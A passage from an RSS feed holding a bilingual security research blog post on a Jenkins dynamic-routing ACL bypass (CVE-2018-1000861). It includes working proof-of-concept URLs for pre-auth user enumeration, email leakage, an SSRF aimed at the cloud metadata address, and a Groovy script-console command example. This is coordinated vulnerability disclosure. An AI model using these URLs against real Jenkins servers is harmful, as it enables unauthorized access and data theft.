    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That means you are restricted to those entrances, but if you can find a cross reference from the white-list entrance jump to other objects, you can still bypass this URL prefix check! It seems a little bit hard to understand. Let’s give a simple example to demonstrate the dynamic routing:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above URL will invoke following methods in sequence!&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This execution chain seems smooth, but sadly, it can not retrieve the result. Therefore, this is not a potential risk, but it’s still a good case to understand the mechanism!&lt;/p&gt;

&lt;p&gt;Once we realize the principle, the remaining part is like solving a maze. &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; is the entry point. Every member in this object can references to a new object, so our work is to chain the object layer by layer till the exit door, that is, the dangerous method invocation!&lt;/p&gt;

&lt;p&gt;By the way, the saddest thing is that this vulnerability cannot invoke the SETTER, otherwise this would definitely be another interesting classLoader manipulation bug just like &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; and &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt;!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;How to exploit? In brief, the whole thing this bug can achieve is to use cross reference objects to bypass ACL policy. To leverage it, we need to find a proper gadget so that we can invoke the object we prefer in this object-forest more conveniently! Here we choose the gadget:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The gadget will invoke following methods sequencely.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In Jenkins, all configurable objects will extend the type &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt;. And, any class who extends the &lt;code class=&quot;highlighter-rouge&quot;&gt;Descriptor&lt;/code&gt; type is accessible by method &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt;. In general, there are totally about 500 class types can be accessed! But due to the architecture of Jenkins. Most developers will check the permission before the dangerous action again. So even we can find a object reference to the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;, without the permission &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt;, we still can’t do anything :(&lt;/p&gt;

&lt;p&gt;Even so, this vulnerability can still be considered as a stepping stone to bypass the first ACL restriction and to chain other bugs. We will show 3 vulnerability-chains as our case study! (Although we just show 3 cases, there are more than 3! If you are intersted, it’s highly recommended to find others by yourself :P )&lt;/p&gt;

&lt;p&gt;P.S. It should be noted that in the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt;, it will invoke &lt;code class=&quot;highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;create&lt;/code&gt; flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;. This result to the creation of a temporary user in memory(which will be listed in the user list but can’t sign in). Although it’s harmless, it is still recognized as a security issue in &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-pre-auth-user-information-leakage&quot;&gt;1. Pre-auth User Information Leakage&lt;/h3&gt;

&lt;p&gt;While testing Jenkins, it’s a common scenario that you want to perform a brute-force attack but you don’t know which account you can try(a valid credential can read the source at least so it’s worth to be the first attempt).&lt;/p&gt;

&lt;p&gt;In this situation, this vulnerability is useful!&lt;br /&gt;
Due to the lack of permission check on search functionality. By modifying the &lt;code class=&quot;highlighter-rouge&quot;&gt;keyword&lt;/code&gt; from a to z, an attacker can list all users on Jenkins!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, this vulnerability can be also chained with &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; which reported by &lt;code class=&quot;highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; to leak user’s email address! Such as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-chained-with-cve-2018-1000600-to-a-pre-auth-fully-responded-ssrf&quot;&gt;2. Chained with CVE-2018-1000600 to a Pre-auth Fully-responded SSRF&lt;/h3&gt;

&lt;p&gt;The next bug is &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, this bug is reported by &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Yes, it’s me :P). About this vulnerability, the official description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It can extract any stored credentials with known credentials ID in Jenkins. But the credentials ID is a random UUID if there is no user-supplied value provided. So it seems impossible to exploit this?(Or if someone know how to obtain credentials ID, please tell me!)&lt;/p&gt;

&lt;p&gt;Although it can’t extract any credentials without known credentials ID, there is still another attack primitive - a fully-response SSRF! We all know how hard it is to exploit a Blind SSRF, so that’s why a fully-responded SSRF is so valuable!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-pre-auth-remote-code-execution&quot;&gt;3. Pre-auth Remote Code Execution&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;PLEASE DON’T BULLSHIT, WHERE IS THE RCE!!!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to maximize the impact, I also find an &lt;strong&gt;INTERESTING&lt;/strong&gt; remote code execution can be chained with this vulnerability to a well-deserved pre-auth RCE! But it’s still on the responsible disclosure process. Please wait and see the Part 2! (Will be published on February 19th :P)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Here is my todo list which can make this vulnerability more perfect. If you find any of them please tell me, really appreciate it :P&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Get the &lt;code class=&quot;highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; object reference under &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. If this can be done, it can bypass the ACL restriction of &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; and &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; to a indeed pre-auth arbitrary file reading!&lt;/li&gt;
  &lt;li&gt;Find another gadget to invoke the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. In order to fix &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins applies a &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;check&lt;/a&gt; on &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; to ensure the least privilege &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt;. So the original gadget will fail after Jenkins version 2.138.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Thanks Jenkins Security team especially Daniel Beck for the coordination and bug fixing! Here is the brief timeline:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - Report vulnerabilities to Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins patched the bug and assigned CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins patched the bug and assigned CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - Report Groovy vulnerability to Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins patched Groovy vulnerability and assigned CVE-2019-1003000, CVE-2019-1003001 and CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在軟體工程中, &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; 及 &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; 一直都被譽為是軟體開發上的必備流程, 有多少優點就不多談, 光是幫助開發者減少許多雜事就是很大的優勢了! 而在 CI/CD 的領域中, Jenkins 是最為老牌且廣為人知的一套工具, 由於它的易用性, 強大的 Pipeline 系統以及對於容器完美的整合使得 Jenkins 也成為目前最多人使用的 CI/CD 應用, 根據 Snyk 在 2018 年所做出的 &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM 生態報告&lt;/a&gt; 中, Jenkins 在 CI/CD 應用中約佔六成的市佔率!&lt;/p&gt;

&lt;p&gt;對於 &lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練(Red Team)&lt;/a&gt; 來說, Jenkins 更是兵家必爭之地, 只要能掌握企業暴露在外的 Jenkins 即可掌握大量的原始碼, 登入憑證甚至控制大量的 Jenkins 節點! 在過去 DEVCORE 所經手過的滲透案子中也出現過數次由 Jenkins 當成進入點, 一步一步從一個小裂縫將目標撕開到完整滲透整間公司的經典案例!&lt;/p&gt;

&lt;p&gt;這篇文章主要是分享去年中針對 Jenkins 所做的一次簡單 Security Review, 過程中共發現了五個 CVE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中比較被大家所討論的應該是 CVE-2018-1999002, 這是一個在 Windows 下的任意檔案讀取, 由於攻擊方式稍微有趣所以討論聲量較高一點, 這個弱點在外邊也有人做了詳細的分析, 詳情可以參考由騰訊雲鼎實驗室所做的分析(&lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;Jenkins 任意文件读取漏洞分析&lt;/a&gt;), 他們也成功的展示從 &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; 找到一台未修補的 Jenkins 實現任意讀檔到遠端代碼執行取得權限的過程!&lt;/p&gt;

&lt;p&gt;但這篇文章要提的並不是這個, 而是當時為了嘗試繞過 CVE-2018-1999002 所需的最小權限 Overall/Read 時跟進 Jenkins 所使用的核心框架 Stapler 挖掘所發現的另外一個問題 - CVE-2018-1000861! 如果光從官方的漏洞敘述應該會覺得很神奇, 真的可以光從隨便一個網址去達成代碼執行嗎?&lt;/p&gt;

&lt;p&gt;針對這個漏洞, 我的觀點是它就是一個存取控制清單(ACL)上的繞過, 但由於這是 Jenkins 架構上的問題並不是單一的程式編寫失誤, 進而導致了這個漏洞利用上的多樣性! 而為了這個技術債, Jenkins 官方也花費了一番心力(&lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins Patch&lt;/a&gt; 及 &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler Patch&lt;/a&gt;)去修復這個漏洞, 不但在原有的架構上介紹了新的路由黑名單及白名單, 也擴展了原有架構的 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; 去保護 Jenkins 路由, 下面就來解釋為何 Jenkins 要花了那麼多心力去修復這個漏洞!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;代碼審查範圍&quot;&gt;代碼審查範圍&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先要聲明的是, 這並不是一次完整的代碼審查(畢竟要做一次太花時間了…), 因此只針對高風險漏洞進行挖掘, 著眼的範圍包括:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins 核心&lt;/li&gt;
  &lt;li&gt;Stapler 網頁框架&lt;/li&gt;
  &lt;li&gt;建議安裝插件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jenkins 在安裝過程中會詢問是否安裝建議的套件(像是 Git, GitHub, SVN 與 Pipeline… 等等), 基本上大多數人都會同意不然就只會得到一個半殘的 Jenkins 很不方便XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jenkins-中的權限機制&quot;&gt;Jenkins 中的權限機制&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;因為這是一個基於 ACL 上的繞過, 所以在解釋漏洞之前, 先來介紹一下 Jenkins 中的權限機制! 在 Jenkins 中有數種不同的角色權限, 甚至有專門的 &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt; (同為建議安裝套件)可針對各專案進行細部的權限設定, 從攻擊者的角度我們粗略分成三種:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;
&lt;p&gt;對於 Jenkins 有完整的控制權, 可對 Jenkins 做任何事! 基本上有這個權限即可透過 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; 介面使用 Groovy 執行任意代碼!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個權限對於駭客來說也是最渴望得到的權限, 但基本上由於安全意識的提升及網路上各種殭屍網路對全網進行掃描, 這種配置已經很少見(或只見於內網)&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;可從 &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; 介面中勾選下面選項來開啟這個模式&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在這個模式下, 所有的內容皆是可讀的, 例如可看到工作日誌或是一些 job/node 等敏感資訊, 對於攻擊者來說在這個模式下最大的好處就是可以獲得大量的原始碼! 但與 Full Access 模式最大的差異則是無法進行更進一步的操作或是執行 Groovy 代碼以取得控制權!&lt;/p&gt;

&lt;p&gt;雖然這不是 Jenkins 的預設設定, 但對於一些習慣自動化的 DevOps 來說還是有可能開啟這個選項, 根據實際在 &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; 上的調查約 12% 的機器還是開啟這個選項! 以下使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; 來代稱這個模式&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;這是 Jenkins 預設安裝好的設定, 在沒有一組有效的帳號密碼狀況下無法看到任何資訊及進行任何操作! 以下使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 來代稱此模式&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;整個漏洞要從 Jenkins 的 &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;動態路由&lt;/a&gt; 講起, 為了給開發者更大的彈性, Jenkins(嚴格來講是 Stapler)使用了一套 Naming Convention 去匹配路由及動態的執行! 首先 Jenkins 以 &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; 為分隔將 URL 符號化, 接著由 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; 為入口點開始往下搜尋, 如果符號符合 (1) Public 屬性的成員或是 (2) Public 屬性的方法符合下列命名規則, 則調用並繼續往下呼叫:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, …)&lt;/li&gt;
    &lt;li&gt;doDynamic(…)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;看起來 Jenkins 給予開發者很大程度的自由去訪問各個物件, 但過於自由總是不好的，根據這種調用方式這裡就出現了兩個問題!&lt;/p&gt;

&lt;h3 id=&quot;1-萬物皆繼承-javalangobject&quot;&gt;1. 萬物皆繼承 java.lang.Object&lt;/h3&gt;
&lt;p&gt;在 Java 中, 所有的物件皆繼承 &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt; 這個類別, 因此所有在 Java 中的物件皆存在著 &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; 這個方法! 而恰巧這個方法又符合命名規則 &lt;code class=&quot;highlighter-rouge&quot;&gt;#1&lt;/code&gt;, 因此 &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; 可在 Jenkins 調用鏈中被動態呼叫!&lt;/p&gt;

&lt;h3 id=&quot;2-跨物件操作導致白名單繞過&quot;&gt;2. 跨物件操作導致白名單繞過&lt;/h3&gt;

&lt;p&gt;前面所提到的 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ&lt;/code&gt;, 其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; 間最大的不同在於當在禁止的狀況下, 最初的入口點會透過 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt; 多做一個基於白名單的 URL 前綴檢查, 這個白名單如下:&lt;/p&gt;

